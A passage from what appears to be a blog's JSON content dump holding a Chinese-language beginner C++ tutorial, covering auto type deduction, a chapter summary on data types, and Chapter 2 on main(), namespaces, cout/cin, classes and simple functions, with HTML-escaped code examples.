auto copy = original; // copy 是 int (非引用, 非 const) const auto const_copy = original; // const_copy 是 const int auto&amp; ref = original; // ref 是 int&amp; (引用) const auto&amp; const_ref = original; // const_ref 是 const int&amp; (const 引用) copy = 200; // OK // const_copy = 200; // 错误! const_copy 是 const ref = 300; // OK, original 也变为 300 // const_ref = 400; // 错误! const_ref 是 const 引用 std::cout &lt;&lt; &quot;original: &quot; &lt;&lt; original &lt;&lt; std::endl; // 输出 300 // 用于复杂类型 (例如 STL 容器迭代器) std::vector&lt;std::string&gt; names = &#123;&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;&#125;; auto it = names.begin(); // it 被推断为 std::vector&lt;std::string&gt;::iterator std::cout &lt;&lt; &quot;First name: &quot; &lt;&lt; *it &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of it: &quot; &lt;&lt; typeid(it).name() &lt;&lt; std::endl; // C++11 列表初始化 auto list1 = &#123;10, 20, 30&#125;; // list1 是 std::initializer_list&lt;int&gt; std::cout &lt;&lt; &quot;Type of list1: &quot; &lt;&lt; typeid(list1).name() &lt;&lt; std::endl; // C++17 列表初始化 (无等号) // auto val&#123;42&#125;; // C++17: val 是 int // std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl; return 0;&#125; 优点: 减少冗余代码，尤其是在类型名称很长时。 提高代码的可维护性，如果初始化表达式的类型改变，auto 变量的类型会自动更新。 有助于泛型编程。 缺点/注意事项: 过度使用可能降低代码的可读性，因为读者需要查看初始化表达式才能确定类型。 auto 推断出的类型可能不是你期望的（例如，忘记添加 &amp; 得到副本而不是引用）。 对于代理类（Proxy Classes），auto 可能推断出代理类型而不是期望的值类型，需要小心。 建议: 在类型冗长、明显或无关紧要时使用 auto 可以提高效率。在类型对于理解代码逻辑很重要时，显式写出类型可能更好。 3.5 总结本章深入探讨了C++用于处理数据的基本内置类型。我们首先学习了简单变量的命名规则和约定，强调了名称的可读性和合法性。 接着，我们详细研究了C++的整型家族，包括 short、int、long 和 C++11 新增的 long long。我们讨论了它们各自的大小、表示范围以及如何选择合适的类型。我们还介绍了 unsigned 类型，它们用于存储非负整数，并具有更大的正数范围。我们学习了如何书写不同进制（十进制、八进制、十六进制，以及C++14的二进制）的整型字面值，以及如何使用后缀（U, L, LL）来指定常量的具体类型，并了解了编译器在没有后缀时如何推断常量类型。 char 类型被介绍为一种特殊的整型，主要用于存储字符，但也可以作为小整数使用。我们学习了字符字面值（使用单引号）和转义序列。bool 类型也被引入，用于表示逻辑真 (true) 和假 (false)，以及它与整数（1和0）之间的转换关系。 为了创建不可修改的变量（常量），我们学习了 const 限定符。使用 const 定义的常量必须在声明时初始化，它提供了类型安全和作用域控制，是比 #define 更受推荐的常量定义方式。 然后，我们转向了浮点类型 (float, double, long double)，用于表示带小数的数字。我们学习了书写浮点数的两种方式（标准小数点和E表示法），了解了不同浮点类型的精度和范围差异，以及如何使用后缀（f, L）指定浮点常量类型（默认为 double）。我们还讨论了浮点数的优点（范围广、表示小数）和固有的缺点（精度限制、比较困难）。 最后，我们学习了C++的基本算术运算符 (+, -, *, /, %)。我们探讨了运算符的优先级和结合性规则，以及如何使用括号来控制运算顺序。特别地，我们区分了整数除法（结果截断）和浮点数除法，并学习了求模运算符 % 的用法（主要用于整数求余）。 类型转换是本章的另一个重点，包括编译器自动执行的隐式转换（如整型提升和算术转换）和程序员指定的显式转换（C风格转换和更安全的C++转换符 static_cast、dynamic_cast、const_cast、reinterpret_cast）。我们强调了转换中可能出现的信息丢失问题。 C++11 引入的 auto 关键字也被介绍，它允许编译器根据初始化表达式自动推断变量类型，简化了代码，尤其是在处理复杂类型时。 通过本章的学习，我们掌握了C++的基本数据类型及其用法，为后续更复杂的数据结构和算法打下了坚实的基础。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 2 开始学习C++","slug":"Cpp_tutorial_Chapter_2","date":"2025-04-26T12:03:35.404Z","updated":"2025-04-26T12:01:13.366Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_2/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_2/","excerpt":"","text":"2.1 进入C++本节将引导你编写第一个C++程序，并介绍一些基本概念。 2.1.1 main()函数每个C++程序都必须包含一个名为 main 的函数。操作系统通过调用 main 函数来启动C++程序。main 函数是程序的入口点。 基本结构: 123456int main() &#123; // 程序代码 return 0; // 表示程序成功执行&#125; int main(): 这是 main 函数的函数头。int 表示 main 函数执行完毕后将返回一个整数值给操作系统。括号 () 表示这是一个函数。 &#123; ... &#125;: 花括号标记了函数体的开始和结束。函数体包含了程序要执行的指令（语句）。 return 0;: 这条语句表示 main 函数执行完毕。返回值 0 通常表示程序成功执行。非零返回值通常表示程序遇到了错误。 示例: 一个最简单的C++程序： 1234int main() &#123; return 0; &#125; 这个程序什么也不做，但它是一个完整的、可以编译和运行的C++程序。 2.1.2 C++注释注释是程序中用于解释代码的部分，它们会被编译器忽略，不会影响程序的执行。注释可以提高代码的可读性。 C++支持两种类型的注释： 单行注释: 以 // 开始，直到该行结束。 多行注释: 以 /* 开始，以 */ 结束，可以跨越多行。 用法与示例: 1234567891011121314#include &lt;iostream&gt; // 这是一个单行注释，解释包含头文件/* 这是一个多行注释。 它可以用来写更长的解释。 下面的 main 函数是程序的入口点。*/int main() &#123; // 使用 cout 输出 &quot;Hello, World!&quot; 到控制台 std::cout &lt;&lt; &quot;Hello, World!&quot; &lt;&lt; std::endl; // endl 用于换行 return 0; // 程序成功结束&#125; 2.1.3 C++预处理器和iostream文件在编译C++程序之前，预处理器会首先处理源代码。预处理器指令以 # 符号开头。 #include 是一个常见的预处理器指令，它告诉预处理器将另一个文件的内容包含到当前文件中。 iostream 文件是C++标准库的一部分，包含了进行输入（input）和输出（output）操作所需的信息。例如，要使用 cout 进行输出，就需要包含 iostream 文件。 用法与示例: 1234567#include &lt;iostream&gt; // 包含 iostream 文件，以便使用 coutint main() &#123; std::cout &lt;&lt; &quot;Hello from iostream!&quot;; return 0;&#125; #include &lt;iostream&gt;: 这条指令告诉预处理器查找名为 iostream 的标准头文件，并将其内容插入到该指令所在的位置。 2.1.4 头文件名头文件（Header Files）包含了函数、类、对象等的声明，使得我们可以在程序中使用它们。C++标准库提供了许多头文件。 标准库头文件: 通常使用尖括号 &lt;&gt; 括起来，例如 &lt;iostream&gt;, &lt;cmath&gt;, &lt;string&gt;。编译器会在标准库的包含路径中查找这些文件。 用户自定义头文件: 通常使用双引号 &quot;&quot; 括起来，例如 &quot;myheader.h&quot;。编译器会首先在当前源文件所在的目录查找，然后在标准包含路径中查找。 C++98之前的头文件: 以前的C++头文件可能带有 .h 后缀（如 &lt;iostream.h&gt;）。现代C++（C++98及以后）推荐使用不带 .h 后缀的标准头文件（如 &lt;iostream&gt;），这些头文件的内容位于 std 命名空间中。 示例: 1234567891011121314#include &lt;iostream&gt; // 标准库头文件#include &lt;cmath&gt; // 包含数学函数，如 sqrt()#include &quot;myutils.h&quot; // 用户自定义头文件 (假设存在 myutils.h)int main() &#123; double num = 9.0; double root = std::sqrt(num); // 使用 cmath 中的 sqrt 函数 std::cout &lt;&lt; &quot;Square root of &quot; &lt;&lt; num &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; std::endl; // 假设 myutils.h 中定义了 printMessage() 函数 // printMessage(&quot;Using custom header!&quot;); return 0;&#125; 2.1.5 名称空间名称空间（Namespace）是C++中避免命名冲突的一种机制。不同的名称空间可以包含同名的函数、类或变量。 标准C++库中的所有内容（如 cout, cin, endl, string 等）都定义在名为 std 的名称空间中。 要使用 std 名称空间中的元素，有几种方法： 使用作用域解析运算符 ::: 在每个元素前加上 std::。 1std::cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; std::endl; 使用 using 声明: 将特定的名称引入当前作用域。 12345678910#include &lt;iostream&gt;using std::cout; // 只引入 coutusing std::endl; // 只引入 endlint main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // 不需要 std:: 前缀 // std::cin &gt;&gt; variable; // 如果要用 cin，仍需 std:: 或 using std::cin; return 0;&#125; 使用 using 编译指令: 将整个名称空间的所有名称引入当前作用域。（不推荐在头文件中或全局作用域中使用，可能导致命名冲突） 12345678910#include &lt;iostream&gt;using namespace std; // 引入 std 中的所有名称int main() &#123; cout &lt;&lt; &quot;Hello!&quot; &lt;&lt; endl; // 不需要 std:: 前缀 int x; cin &gt;&gt; x; // cin 也不需要 std:: 前缀 return 0;&#125; 推荐做法: 在 .cpp 文件的函数内部或较小作用域内，可以使用 using 声明或 using namespace std;。 在头文件 (.h) 中，绝对不要使用 using namespace std;，应始终使用 std:: 前缀。 在简单的示例或小型项目中，using namespace std; 可以简化代码，但在大型项目中，坚持使用 std:::: 或 using 声明是更安全的做法。 2.1.6 使用cout进行C++输出cout 是 iostream 库中预定义的一个对象，代表标准输出流，通常连接到控制台（屏幕）。 &lt;&lt; 运算符（插入运算符）用于将数据发送给 cout 对象，使其显示在屏幕上。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; // 输出字符串字面量 std::cout &lt;&lt; &quot;Welcome to C++!&quot;; // 输出换行符 (使用 std::endl) std::cout &lt;&lt; std::endl; // 输出数字 std::cout &lt;&lt; &quot;The year is &quot;; std::cout &lt;&lt; 2024; std::cout &lt;&lt; std::endl; // 链式输出 int age = 30; std::cout &lt;&lt; &quot;My age is: &quot; &lt;&lt; age &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; // 输出特殊字符 (使用转义序列) std::cout &lt;&lt; &quot;This is a tab:\\t.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a newline:\\n.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a quote: \\&quot; &quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;This is a backslash: \\\\&quot; &lt;&lt; std::endl; return 0;&#125; std::endl: 是一个特殊的控制符（manipulator），它会输出一个换行符，并刷新输出缓冲区（确保内容立即显示）。 \\n: 是一个转义字符，代表换行符。它只输出换行，通常不保证立即刷新缓冲区。在多数情况下，\\n 比 std::endl 效率稍高。 2.1.7 C++源代码的格式化C++语言对代码格式（如空格、缩进、换行）的要求相对宽松，但良好的格式化对于代码的可读性和可维护性至关重要。 基本规则和建议: 语句分隔: C++使用分号 ; 来结束大多数语句。 空格: 通常在运算符（=, +, -, *, /, &lt;&lt;, &gt;&gt;, == 等）两边添加空格。 在逗号 , 后面添加空格。 在函数名和后面的括号 () 之间通常不加空格。 缩进: 使用一致的缩进（通常是4个空格或一个制表符）来表示代码块（如 main 函数体、循环体、条件语句体）。这极大地提高了代码结构的可读性。 换行: 通常每行只写一条语句。 可以在合适的地方（如运算符之后、逗号之后）将长语句分成多行。 花括号 &#123;&#125;: 对于代码块（如函数体、if 语句块等），花括号的放置风格有多种（如 K&amp;R 风格、Allman 风格），选择一种并保持一致即可。 示例 (良好格式): 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; // 左花括号通常独占一行或在行尾 int score = 100; std::cout &lt;&lt; &quot;Initial score: &quot; &lt;&lt; score &lt;&lt; std::endl; if (score &gt; 90) &#123; // 缩进表示 if 块内部 std::cout &lt;&lt; &quot;Excellent!&quot; &lt;&lt; std::endl; score = score + 5; // 在运算符两边加空格 &#125; // 右花括号通常独占一行，与对应块的起始对齐 std::cout &lt;&lt; &quot;Final score: &quot; &lt;&lt; score &lt;&lt; std::endl; return 0;&#125; 示例 (不良格式，但语法正确): 12#include &lt;iostream&gt;int main()&#123;int score=100;std::cout&lt;&lt;&quot;Initial score: &quot;&lt;&lt;score&lt;&lt;std::endl;if(score&gt;90)&#123;std::cout&lt;&lt;&quot;Excellent!&quot;&lt;&lt;std::endl;score=score+5;&#125;std::cout&lt;&lt;&quot;Final score: &quot;&lt;&lt;score&lt;&lt;std::endl;return 0;&#125; 虽然第二个示例也能编译运行，但极难阅读和理解。遵循一致的、清晰的格式化风格是专业编程的重要组成部分。 2.2 C++语句C++程序由一系列语句组成。语句是C++程序的基本执行单元，通常以分号 ; 结尾。本节将介绍两种基本的语句：声明语句和赋值语句，并进一步探讨 cout 的用法。 2.2.1 声明语句和变量声明语句 (Declaration Statement) 用于向编译器声明程序中将要使用的变量 (Variable) 的名称和类型。 变量 是计算机内存中用于存储数据的一块区域，并且有一个名字（标识符）。通过变量名，我们可以访问和修改存储在内存中的数据。在使用变量之前，必须先声明它。 声明变量的语法: 1typeName variableName; typeName: 指定变量要存储的数据类型（例如 int 表示整数，double 表示浮点数）。 variableName: 你为变量选择的名称（标识符）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // 声明一个名为 carrots 的整型变量 int carrots; // 声明多个同类型的变量 int dogs, cats; // 声明并同时初始化变量 (赋初值) int fleas = 10; double price = 99.99; // C++11 列表初始化 (更推荐) int hamsters = &#123;5&#125;; int gerbils&#123;8&#125;; // 花括号可以省略等号 int rats&#123;&#125;; // 初始化为 0 // ... 后续可以使用这些变量 ... carrots = 25; // 赋值 std::cout &lt;&lt; &quot;I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fleas: &quot; &lt;&lt; fleas &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Hamsters: &quot; &lt;&lt; hamsters &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Rats: &quot; &lt;&lt; rats &lt;&lt; std::endl; return 0;&#125; 声明 (Declaration): 告诉编译器变量的名称和类型。 定义 (Definition): 声明通常也是定义，因为它会为变量分配内存空间。 初始化 (Initialization): 在声明变量的同时给它赋一个初始值。这是一个好习惯，可以避免使用未定义的值。 2.2.2 赋值语句赋值语句 (Assignment Statement) 用于将一个值赋给一个变量。它使用赋值运算符 =。 语法: 1variableName = value; variableName: 要接收值的变量的名称（必须是已声明的变量）。 value: 要赋给变量的值。这可以是一个字面常量（如 25）、另一个变量、或一个表达式的结果。 重要概念: 赋值操作是将右侧的值复制到左侧的变量中。 左侧必须是一个可修改的**左值 (lvalue)**，通常就是一个变量名。 右侧可以是一个**右值 (rvalue)**，即一个可以产生值的表达式。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int carrots; // 声明变量 carrots = 25; // 赋值语句：将 25 赋给 carrots std::cout &lt;&lt; &quot;Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; carrots = carrots - 1; // 赋值语句：将表达式 carrots - 1 的结果 (24) 赋给 carrots std::cout &lt;&lt; &quot;Crunch, crunch. Now I have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; int dogs = 5; // 声明并初始化 int cats; // 声明 cats = dogs; // 赋值语句：将 dogs 的值 (5) 赋给 cats std::cout &lt;&lt; &quot;Dogs: &quot; &lt;&lt; dogs &lt;&lt; &quot;, Cats: &quot; &lt;&lt; cats &lt;&lt; std::endl; // 可以链式赋值 (从右向左执行) int a, b, c; a = b = c = 10; // c=10, 然后 b=c (即 b=10), 然后 a=b (即 a=10) std::cout &lt;&lt; &quot;a=&quot; &lt;&lt; a &lt;&lt; &quot;, b=&quot; &lt;&lt; b &lt;&lt; &quot;, c=&quot; &lt;&lt; c &lt;&lt; std::endl; return 0;&#125; 2.2.3 cout的新花样我们在 2.1.6 节已经学习了如何使用 cout 输出字符串和使用 endl 换行。cout 的一个强大之处在于它的“智能”，它可以识别并正确显示多种不同类型的数据。 cout 对象与插入运算符 &lt;&lt; 结合使用，可以自动处理 C++ 的内置数据类型，如整数 (int)、浮点数 (double, float)、字符 (char) 以及 C 风格字符串和 std::string 对象。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 类int main() &#123; int age = 30; double weight = 65.5; char initial = &#x27;J&#x27;; std::string name = &quot;Alice&quot;; // C++ string 对象 const char* city = &quot;New York&quot;; // C 风格字符串 // cout 可以自动处理不同类型 std::cout &lt;&lt; &quot;--- Personal Information ---&quot; &lt;&lt; std::endl; // 输出整数 std::cout &lt;&lt; &quot;Age: &quot;; // 输出提示信息 std::cout &lt;&lt; age; // 输出 age 变量的值 (整数) std::cout &lt;&lt; std::endl; // 换行 // 输出浮点数 std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; // 链式输出 // 输出字符 std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; // 输出 C++ string 对象 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; // 输出 C 风格字符串 std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; // 混合输出 std::cout &lt;&lt; name &lt;&lt; &quot; is &quot; &lt;&lt; age &lt;&lt; &quot; years old and lives in &quot; &lt;&lt; city &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; // 输出表达式结果 std::cout &lt;&lt; &quot;Next year, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; age + 1 &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; return 0;&#125; cout 之所以能做到这一点，是因为 &lt;&lt; 运算符针对不同的数据类型进行了**重载 (Overloading)**（我们将在后续章节详细学习）。简单来说，就是为 &lt;&lt; 运算符定义了多个版本，每个版本知道如何处理特定类型的数据，并将它们转换为适合输出的字符序列。 2.3 其他C++语句本节将介绍更多C++语句，包括如何从用户那里获取输入，如何更灵活地使用 cout，并对C++的核心概念——类进行初步介绍。 2.3.1 使用cin与 cout 用于输出类似，cin 是 iostream 库中预定义的一个对象，代表标准输入流，通常连接到键盘。我们可以使用 cin 来读取用户输入的数据。 &gt;&gt; 运算符（提取运算符）用于从 cin 对象获取数据，并将其存储到变量中。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt; // 必须包含 iostream 以使用 cin 和 coutint main() &#123; int carrots; // 声明一个整型变量来存储输入 std::cout &lt;&lt; &quot;How many carrots do you have?&quot; &lt;&lt; std::endl; // 提示用户输入 std::cin &gt;&gt; carrots; // 从键盘读取一个整数，并存储到 carrots 变量中 std::cout &lt;&lt; &quot;Here are two more. &quot;; carrots = carrots + 2; // 对变量进行操作 // 输出结果 std::cout &lt;&lt; &quot;Now you have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; // 读取其他类型的数据 double price; std::cout &lt;&lt; &quot;Enter the price per carrot: &quot;; std::cin &gt;&gt; price; // 读取一个浮点数 std::cout &lt;&lt; &quot;The total cost for &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots is: &quot; &lt;&lt; carrots * price &lt;&lt; std::endl; return 0;&#125; #include &lt;iostream&gt;: 使用 cin 同样需要包含此头文件。 std::cin: cin 对象也位于 std 名称空间中。 cin &gt;&gt; variable;: 提取运算符 &gt;&gt; 从输入流（键盘）中读取数据，并根据 variable 的类型进行解释，然后将值存入 variable。cin 也会根据读取的数据类型自动进行转换。 输入分隔: cin 通常使用空白（空格、制表符、换行符）来分隔不同的输入项。例如，如果程序期望读取两个整数 cin &gt;&gt; a &gt;&gt; b;，用户可以输入 10 20 然后按 Enter，或者输入 10 按 Enter 再输入 20 按 Enter。 2.3.2 使用cout进行拼接我们在前面已经看到如何使用 cout 和插入运算符 &lt;&lt; 输出单个值或字符串。cout 的一个便捷之处在于，你可以在一条语句中连续使用 &lt;&lt; 运算符，将多个输出项“拼接”在一起。这称为**链式输出 (Chaining Output)**。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 类型int main() &#123; int age = 28; std::string name = &quot;Bob&quot;; double weight = 75.3; // 不使用拼接的写法 (多条语句) std::cout &lt;&lt; &quot;Name: &quot;; std::cout &lt;&lt; name; std::cout &lt;&lt; &quot;, Age: &quot;; std::cout &lt;&lt; age; std::cout &lt;&lt; &quot;, Weight: &quot;; std::cout &lt;&lt; weight; std::cout &lt;&lt; std::endl; // 使用拼接的写法 (单条语句，更简洁) std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; &quot;, Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; // 拼接不同类型的数据 std::cout &lt;&lt; &quot;In 5 years, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; (age + 5) &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; return 0;&#125; cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;: cout 对象在处理完第一个 &lt;&lt; item1 后，会返回自身 (cout)，因此可以继续处理下一个 &lt;&lt; item2，以此类推。 这种链式调用使得将变量值、字符串字面量和表达式结果组合输出变得非常方便和易读。 2.3.3 类简介类 (Class) 是C++的核心概念，也是面向对象编程（OOP）的基础。可以把类看作是创建对象 (Object) 的蓝图或模板。 封装 (Encapsulation): 类将数据（称为成员变量或属性）和操作这些数据的函数（称为成员函数或方法）捆绑在一起。 抽象 (Abstraction): 类提供了一个接口（通过其公有成员函数），隐藏了内部实现的复杂细节。 我们已经在使用类的对象了！cout 和 cin 就是 C++ 标准库中定义的类的对象： cout 是 ostream 类（输出流类）的一个对象。 cin 是 istream 类（输入流类）的一个对象。 ostream 类定义了如何处理输出，包括 &lt;&lt; 运算符如何针对不同数据类型工作。istream 类定义了如何处理输入，包括 &gt;&gt; 运算符如何读取数据。 概念理解: 想象一下 “汽车” 这个类： 数据/属性 (成员变量): 颜色、品牌、型号、当前速度、油量等。 操作/行为 (成员函数): 启动()、加速()、刹车()、鸣笛()、获取当前速度() 等。 根据这个 “汽车” 类，我们可以创建具体的对象，比如 “我的蓝色丰田卡罗拉” 或 “邻居的红色法拉利”。每个对象都有自己的属性值（不同的颜色、品牌等），但它们都共享类定义的行为（都可以启动、加速、刹车）。 示例 (概念性，非完整代码): 123456789101112131415161718// 这是一个非常简化的概念展示，不是完整的 C++ 类定义class Car &#123;public: // 公有接口，外部可以访问 void startEngine(); // 成员函数声明 void accelerate(int amount); void displayInfo(); private: // 私有数据，外部不能直接访问，只能通过成员函数 std::string color; std::string brand; int currentSpeed;&#125;;// ... 在程序的其他地方 ...// Car myCar; // 创建一个 Car 类的对象 (需要构造函数等，此处省略)// myCar.startEngine(); // 调用对象的成员函数// myCar.accelerate(50);// myCar.displayInfo(); 在后续章节中，我们将深入学习如何定义和使用自己的类。目前，只需理解类是定义数据和相关操作的一种方式，而对象是类的具体实例，cout 和 cin 就是我们已经接触到的对象实例。 2.4 函数函数是C++程序的构建块，它们是执行特定任务的命名代码段。使用函数可以使程序模块化、更易于理解和维护。本节将介绍如何使用和定义函数。 2.4.1 使用有返回值的函数许多C++函数会执行一个操作并返回一个值给调用它的代码。这种函数被称为**有返回值的函数 (Function with Return Value)**。 我们已经使用过一些有返回值的函数，例如 C++ 标准库 &lt;cmath&gt; (或 C 语言的 &lt;math.h&gt;) 中提供的 sqrt() 函数，它计算一个数的平方根并返回结果。 使用方法: 包含头文件: 确保包含了提供该函数声明的头文件（例如 &lt;cmath&gt;）。 函数调用: 使用函数名，并在括号 () 内提供所需的**参数 (Argument)**（传递给函数的值）。 处理返回值: 函数调用本身就是一个表达式，其值就是函数的返回值。可以将这个返回值赋给变量、用在更复杂的表达式中或直接输出。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cmath&gt; // 包含 cmath 头文件以使用 sqrt() 函数int main() &#123; double area; std::cout &lt;&lt; &quot;Enter the floor area, in square feet, of your home: &quot;; std::cin &gt;&gt; area; // 读取用户输入的面积 // 调用 sqrt() 函数，并将参数 area 传递给它 // 函数的返回值 (area 的平方根) 被赋给变量 side double side = std::sqrt(area); std::cout &lt;&lt; &quot;That&#x27;s the equivalent of a square &quot; &lt;&lt; side &lt;&lt; &quot; feet to the side.&quot; &lt;&lt; std::endl; // 也可以直接在输出语句中使用返回值 std::cout &lt;&lt; &quot;The square root of 16 is: &quot; &lt;&lt; std::sqrt(16) &lt;&lt; std::endl; // 返回值可以用在表达式中 double hypotenuse = std::sqrt(3.0 * 3.0 + 4.0 * 4.0); // 计算直角三角形斜边 std::cout &lt;&lt; &quot;Hypotenuse of a 3-4 triangle: &quot; &lt;&lt; hypotenuse &lt;&lt; std::endl; return 0;&#125; std::sqrt(area): 这是一个函数调用。std::sqrt 是函数名，area 是传递给函数的参数。 double side = ...: sqrt() 函数返回一个 double 类型的值，这个值被用来初始化 side 变量。 2.4.2 函数变体函数可以有多种形式： 有参数，有返回值: 如 sqrt(double x)，接收一个 double 参数，返回一个 double 值。 无参数，有返回值: 例如，某些库函数可能读取系统时间并返回一个值，不需要用户提供参数。 有参数，无返回值: 这种函数执行一个操作（如打印到屏幕），但不需要返回任何计算结果。这种函数的返回类型通常声明为 void。我们将在 2.4.3 节看到例子。 无参数，无返回值: 执行一个固定的操作，不接受输入参数也不返回结果，返回类型也是 void。 示例 (概念性): 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstdlib&gt; // 为了 rand() 和 srand()#include &lt;ctime&gt; // 为了 time()// 示例 1: 有参数，有返回值 (我们将在 2.4.4 定义自己的)// double calculate_something(int input); // 示例 2: 无参数，有返回值int getRandomNumber() &#123; // 使用 C 标准库函数生成一个伪随机数 return std::rand() % 100; // 返回 0-99 之间的随机数&#125;// 示例 3: 有参数，无返回值 (我们将在 2.4.3 定义自己的)// void printMessage(std::string msg); // 示例 4: 无参数，无返回值void showStartupMessage() &#123; std::cout &lt;&lt; &quot;Program starting...&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-------------------&quot; &lt;&lt; std::endl;&#125;int main() &#123; // 初始化随机数生成器 (通常只需一次) std::srand(std::time(0)); showStartupMessage(); // 调用无参数、无返回值的函数 int randomNumber = getRandomNumber(); // 调用无参数、有返回值的函数 std::cout &lt;&lt; &quot;Random number: &quot; &lt;&lt; randomNumber &lt;&lt; std::endl; // 调用其他类型的函数 (假设已定义) // printMessage(&quot;Processing data...&quot;); // double result = calculate_something(10); // std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 2.4.3 用户定义的函数除了使用库函数，我们还可以定义自己的函数来执行特定任务。这有助于组织代码和重用代码。 定义函数的基本结构: 123456returnType functionName(parameterList) &#123; // 函数体: 包含执行任务的语句 // ... // 如果 returnType 不是 void，则需要 return 语句返回一个值&#125; returnType: 函数执行完毕后返回的数据类型。如果函数不返回值，则使用 void。 functionName: 你为函数选择的名称。 parameterList: 函数接受的参数列表，包括每个参数的类型和名称。如果没有参数，括号 () 仍然需要，但内部为空。 &#123; ... &#125;: 函数体，包含函数的代码。 函数原型 (Function Prototype): 在使用函数之前，编译器需要知道函数的接口（返回类型、名称、参数列表）。通常将函数原型放在 main() 函数之前或单独的头文件中。原型看起来像函数头，但以分号 ; 结尾，可以省略参数名。 1returnType functionName(parameterTypeList); // 函数原型 用法与示例 (定义一个无返回值的函数): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 函数原型 (声明)void cheers(int n); // 声明 cheers 函数接受一个 int 参数，无返回值int main() &#123; std::cout &lt;&lt; &quot;Enter an integer: &quot;; int count; std::cin &gt;&gt; count; cheers(count); // 函数调用：将 count 的值传递给 cheers 函数 std::cout &lt;&lt; &quot;Done!&quot; &lt;&lt; std::endl; return 0;&#125;// 函数定义void cheers(int n) // 定义 cheers 函数，参数名为 n&#123; // 函数体 for (int i = 0; i &lt; n; i++) &#123; std::cout &lt;&lt; &quot;Cheers! &quot;; &#125; std::cout &lt;&lt; std::endl; // 因为返回类型是 void，所以不需要 return 语句返回值&#125; 原型: void cheers(int n); 告诉编译器 main 函数后面会定义一个名为 cheers 的函数。 调用: cheers(count); 执行 cheers 函数的代码，并将 count 的值复制给 cheers 函数的参数 n（这称为按值传递）。 定义: 提供了 cheers 函数的具体实现。 2.4.4 用户定义的有返回值的函数我们可以定义自己的函数来执行计算并返回结果。只需将 returnType 指定为期望的返回类型，并在函数体中使用 return 语句返回一个该类型的值。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;// 函数原型: 声明 cube 函数接受一个 double 参数，返回一个 double 值double cube(double x); int main() &#123; double side; std::cout &lt;&lt; &quot;Enter the side length of a cube: &quot;; std::cin &gt;&gt; side; double volume = cube(side); // 调用 cube 函数，将返回值赋给 volume std::cout &lt;&lt; &quot;A cube with side &quot; &lt;&lt; side &lt;&lt; &quot; has a volume of &quot; &lt;&lt; volume &lt;&lt; &quot; cubic units.&quot; &lt;&lt; std::endl; // 也可以直接使用返回值 std::cout &lt;&lt; &quot;The cube of 2.5 is &quot; &lt;&lt; cube(2.5) &lt;&lt; std::endl; return 0;&#125;// 函数定义double cube(double x) &#123; // 函数体 double result = x * x * x; return result; // 返回计算结果 (类型必须与声明的返回类型 double 兼容) // 或者更简洁地： // return x * x * x; &#125; 原型: double cube(double x); 声明了函数的接口。 调用: cube(side) 调用函数，side 的值被传递给参数 x。函数执行后返回一个 double 值。 定义: double cube(double x) 提供了函数的实现。return result; 将计算出的立方值返回给调用者。 2.4.5 在多函数程序中使用using编译指令当程序包含多个函数时，每个函数都需要访问 std 名称空间中的元素（如 cout, cin, endl）。有几种处理方式： 在每个函数中都使用 std:: 前缀: 这是最安全的方式，尤其是在头文件中，但可能使代码冗长。 12345678void func1() &#123; std::cout &lt;&lt; &quot;Hello from 